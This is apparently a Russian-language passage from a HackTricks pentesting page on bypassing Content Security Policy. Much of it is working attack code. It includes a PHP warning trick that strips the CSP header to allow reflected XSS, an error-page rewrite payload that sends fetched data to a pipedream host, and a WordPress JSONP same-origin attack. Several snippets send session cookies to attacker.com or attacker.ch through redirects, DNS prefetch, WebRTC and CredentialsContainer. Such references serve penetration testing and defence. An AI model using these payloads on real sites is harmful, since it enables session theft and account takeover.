Поскольку заголовки должны быть отправлены до любого вывода, предупреждения, выдаваемые PHP, могут аннулировать последующие вызовы `header()`. Если пользовательский ввод превышает `max_input_vars`, PHP сначала выдает предупреждение о запуске; любой последующий вызов `header('Content-Security-Policy: ...')` завершится ошибкой "headers already sent", фактически отключая CSP и позволяя выполнить отражающий XSS, который в противном случае был бы заблокирован.

```php
<?php
header("Content-Security-Policy: default-src 'none';");
echo $_GET['xss'];
```

Пример:

```bash
# CSP включена → полезная нагрузка блокируется браузером
curl -i "http://orange.local/?xss=<svg/onload=alert(1)>"

# Превышение max_input_vars для принудительного вывода предупреждений перед header() → CSP удалена
curl -i "http://orange.local/?xss=<svg/onload=alert(1)>&A=1&A=2&...&A=1000"
# Warning: PHP Request Startup: Input variables exceeded 1000 ...
# Warning: Cannot modify header information - headers already sent
```

**Перезапись страницы ошибки (Rewrite Error Page)**

Из этого решения видно, что можно было обойти защиту CSP, загрузив страницу ошибки (возможно, без CSP) и переписав ее содержимое.

```javascript
a = window.open("/" + "x".repeat(4100))
setTimeout(function () {
  a.document.body.innerHTML = `<img src=x onerror="fetch('https://filesharing.m0lec.one/upload/ffffffffffffffffffffffffffffffff').then(x=>x.text()).then(x=>fetch('https://enllwt2ugqrt.x.pipedream.net/'+x))">`
}, 1000)
```

**SOME + 'self' + wordpress**

SOME — это техника, которая использует XSS (или сильно ограниченный XSS) в конечной точке страницы для злоупотребления другими конечными точками того же источника. Это делается путем загрузки уязвимой конечной точки со страницы атакующего, а затем обновления страницы атакующего до реальной конечной точки в том же источнике, которую вы хотите использовать. Таким образом, уязвимая конечная точка может использовать объект `opener` в полезной нагрузке для доступа к DOM реальной конечной точки для злоупотребления. Для получения дополнительной информации проверьте:

{{#ref}} ../xss-cross-site-scripting/some-same-origin-method-execution.md {{#endref}}

Более того, wordpress имеет конечную точку JSONP по адресу `/wp-json/wp/v2/users/1?_jsonp=data`, которая отразит отправленные данные в выводе (с ограничением только букв, цифр и точек).

Злоумышленник может использовать эту конечную точку для генерации SOME-атаки против WordPress и встроить ее внутрь `<script src=/wp-json/wp/v2/users/1?_jsonp=some_attack></script>`. Обратите внимание, что этот скрипт будет загружен, потому что он разрешен `'self'`. Более того, и поскольку WordPress установлен, злоумышленник может использовать SOME-атаку через уязвимую конечную точку обратного вызова, которая обходит CSP, чтобы дать пользователю больше привилегий, установить новый плагин...

Для получения дополнительной информации о том, как выполнить эту атаку, проверьте https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/

**Обходы кражи данных через CSP (CSP Exfiltration Bypasses)**

Если действует строгая CSP, которая не позволяет вам взаимодействовать с внешними серверами, есть несколько вещей, которые вы всегда можете сделать для кражи информации.

**Location**

Вы можете просто обновить местоположение (`location`), чтобы отправить секретную информацию на сервер злоумышленника:

```javascript
var sessionid = document.cookie.split("=")[1] + "."
document.location = "https://attacker.com/?" + sessionid
```

**Meta-тег**

Вы можете перенаправить, внедрив мета-тег (это просто перенаправление, это не приведет к утечке содержимого).

```html
<meta http-equiv="refresh" content="1; http://attacker.com" />
```

**Предварительная выборка DNS (DNS Prefetch)**

Чтобы ускорить загрузку страниц, браузеры предварительно разрешают имена хостов в IP-адреса и кэшируют их для последующего использования.
Вы можете указать браузеру предварительно разрешить имя хоста с помощью: `<link rel="dns-prefetch" href="something.com">`

Вы можете использовать это поведение для кражи конфиденциальной информации через DNS-запросы:

```javascript
var sessionid = document.cookie.split("=")[1] + "."
var body = document.getElementsByTagName("body")[0]
body.innerHTML =
  body.innerHTML +
  '<link rel="dns-prefetch" href="//' +
  sessionid +
  'attacker.ch">'
```

Другой способ:

```javascript
const linkEl = document.createElement("link")
linkEl.rel = "prefetch"
linkEl.href = urlWithYourPreciousData
document.head.appendChild(linkEl)
```

Чтобы предотвратить это, сервер может отправить HTTP-заголовок:

```
X-DNS-Prefetch-Control: off
```

**Подсказка:** По-видимому, эта техника не работает в безголовых браузерах (ботах).

**WebRTC**

На многих страницах можно прочитать, что WebRTC не проверяет политику `connect-src` CSP.

На самом деле вы можете отправлять информацию, используя DNS-запрос. Проверьте этот код:

```javascript
;(async () => {
  p = new RTCPeerConnection({ iceServers: [{ urls: "stun:LEAK.dnsbin" }] })
  p.createDataChannel("")
  p.setLocalDescription(await p.createOffer())
})()
```

Другой вариант:

```javascript
var pc = new RTCPeerConnection({
  "iceServers":[
      {"urls":[
        "turn:74.125.140.127:19305?transport=udp"
       ],"username":"_all_your_data_belongs_to_us",
      "credential":"."
    }]
});
pc.createOffer().then((sdp)=>pc.setLocalDescription(sdp));
```

**CredentialsContainer**

Всплывающее окно с учетными данными отправляет DNS-запрос на `iconURL` без ограничений со стороны страницы. Это работает только в безопасном контексте (HTTPS) или на localhost.

```javascript
navigator.credentials.store(
  new FederatedCredential({
    id:"satoki", 
    name:"satoki", 
    provider:"https:"+your_data+"example.com", 
    iconURL:"https:"+your_data+"example.com"
    })
  )
```

**Проверка политик CSP онлайн**




* [Origin](https://github.com/HackTricks-wiki/hacktricks/blob/master/src/pentesting-web/content-security-policy-csp-bypass/README.md)
